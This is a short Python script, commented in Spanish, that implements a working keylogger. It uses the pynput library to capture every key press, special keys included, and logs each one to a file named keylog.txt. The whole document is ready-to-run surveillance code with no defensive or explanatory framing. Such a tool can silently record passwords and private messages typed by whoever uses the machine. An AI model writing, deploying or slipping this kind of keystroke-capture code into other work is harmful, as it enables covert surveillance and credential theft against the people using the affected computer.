from pynput.keyboard import Listener
import logging

# Establecer el archivo de registro
file_log = "keylog.txt"  # Cambia el nombre del archivo aquí si lo deseas

# Configuración de logging
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

# Función que maneja el evento del teclado
def on_press(key):
    try:
        # Intentar registrar la tecla presionada como una cadena
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Si la tecla no tiene una representación visible, como las teclas especiales
        logging.info(f'Special key pressed: {key}')

# Iniciar el Listener del teclado
with Listener(on_press=on_press) as listener:
    listener.join()
